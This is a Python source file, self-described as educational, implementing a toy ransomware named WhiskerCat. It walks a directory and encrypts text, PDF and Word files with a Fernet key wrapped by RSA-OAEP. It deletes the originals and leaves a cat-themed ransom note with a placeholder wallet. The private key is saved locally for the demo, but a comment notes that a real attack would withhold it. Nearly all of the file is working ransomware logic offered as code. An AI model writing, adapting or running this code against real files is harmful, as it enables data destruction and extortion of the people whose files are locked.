#!/usr/bin/env python3

""" 
This is a simple implementation of a ransomware for educational purposes only.
"""

import os
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization

TEST_DIR = "test_files"
RANSOM_NOTE = "ransom_note.txt"
ENCRYPTED_EXTENSION = ".whisker"

RANSOM_MESSAGE = r"""
 /_/\  
( o.o ) Meow meow!
 > ^ <

I am WhiskerCat, the sneakiest cat in town!
I have encrypted your precious files with my sharp claws.
To get them back, you must give me a treat... 
Here is my wallet address: WhiskerCat1234567890, and don't forget the fish!


  ,-.       _,---._ __  / \
 /  )    .-'       `./ /   \
(  (   ,'            `/    /|
 \  `-"             \'\   / |
  `.              ,  \ \ /  |
   /`.          ,'-`----Y   |
  (            ;        |   '
  |  ,-.    ,-'         |  /
  |  | (   |  your files| /
  )  |  \  `.___________|/
  `--'   `--' 
"""

class WhiskerCat:
    """Principal class for the ransomware."""
    def __init__(self, directory):
        self.target_dir = directory
        self.encrypted_files = []

    def generate_keys(self):
        self.symmetric_key = Fernet.generate_key()
        self.cipher = Fernet(self.symmetric_key)

        # in a real ransomware, the private key would be kept secret
        self.private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        self.public_key = self.private_key.public_key()

        self.encrypted_key = self.public_key.encrypt(
            self.symmetric_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    def save_encrypted_key(self):
        """Saves the encrypted symmetric key to a file"""
        with open("encrypted_key.bin", "wb") as f:
            f.write(self.encrypted_key)
        
        # for educational purposes, we will also save the private key
        # in a real ransomware, this would be kept secret
        pem = self.private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        with open("private_key.pem", "wb") as f:
            f.write(pem)
    
    def create_ransom_note(self):
        """Creates a ransom note"""
        with open(os.path.join(self.target_dir, RANSOM_NOTE), "w") as note:
            note.write(RANSOM_MESSAGE)

    def encrypt_file(self, file_path):
        """Encrypts a file"""
        try:
            with open(file_path, 'rb') as file:
                data = file.read()
            
            encrypted_data = self.cipher.encrypt(data)
            
            with open(file_path + ENCRYPTED_EXTENSION, 'wb') as file:
                file.write(encrypted_data)
    
            os.remove(file_path)
            self.encrypted_files.append(file_path + ENCRYPTED_EXTENSION)
            return True
        except Exception as e:
            print(f"Error encrypting file '{file_path}': {e}")
            return False
        
    def encrypt_directory(self, extensions=['.txt', '.pdf', '.docx']):
        """Encrypts all files in the target directory with the specified extensions"""
        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path)

        with open(f"{self.target_dir}/encrypted_files_list.txt", "w") as f:
            for file_path in self.encrypted_files:
                f.write(f"{file_path}\n")
        
        self.create_ransom_note()
      
    def decrypt_directory(self):
        """Decrypts all encrypted files in the target directory."""
        try:
            with open(f"{self.target_dir}/encrypted_files_list.txt", 'rb') as file:
                self.encrypted_files = file.read().decode().splitlines()
            
        except FileNotFoundError:
            print("No encrypted files list found. Please encrypt files first.")
            return
        except Exception as e:
            print(f"Error reading encrypted files list: {e}")
            return
            
        for file_path in self.encrypted_files:
            self.decrypt_file(file_path)

    def decrypt_file(self, encrypted_file_path):
        """Decrypts a file""" 
        try:
            with open(encrypted_file_path, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher.decrypt(encrypted_data)
            
            original_path = encrypted_file_path.replace(ENCRYPTED_EXTENSION, '')
            with open(original_path, 'wb') as file:
                file.write(decrypted_data)
            
            return True
        except Exception as e:
            print(f"Erro ao descriptografar {encrypted_file_path}: {e}")
            return False

    def load_and_decrypt_key(self, private_key_path="private_key.pem", encrypted_key_path="encrypted_key.bin"):
        """
        Simulates the recovery process after 'ransom payment'
        Loads the private key and uses it to decrypt the symmetric key
        """
        try:
            with open(private_key_path, "rb") as key_file:
                private_key = serialization.load_pem_private_key(
                    key_file.read(),
                    password=None,
                    backend=default_backend()
                )
            
            with open(encrypted_key_path, "rb") as key_file:
                encrypted_key = key_file.read()
            
            symmetric_key = private_key.decrypt(
                encrypted_key,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            self.cipher = Fernet(symmetric_key)
            return True
        except Exception as e:
            print(f"Error recovering key: {e}")
            return False


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python ransom.py [encrypt|decrypt]")
        sys.exit(1) 
    
    whisker = WhiskerCat(TEST_DIR)
    
    if sys.argv[1] == "encrypt":
        print("Starting encryption process...")
        print("Generating keys...")
        whisker.generate_keys()
        print("Saving keys...")
        whisker.save_encrypted_key()
        print("Encrypting files...")
        whisker.encrypt_directory()
        print("Encryption complete!")

    elif sys.argv[1] == "decrypt":
        print("Starting decryption process...")
        print("Loading and decrypting key...") 
        whisker.load_and_decrypt_key()
        print("Decrypting files...")
        whisker.decrypt_directory()
        
        print("Decryption complete!")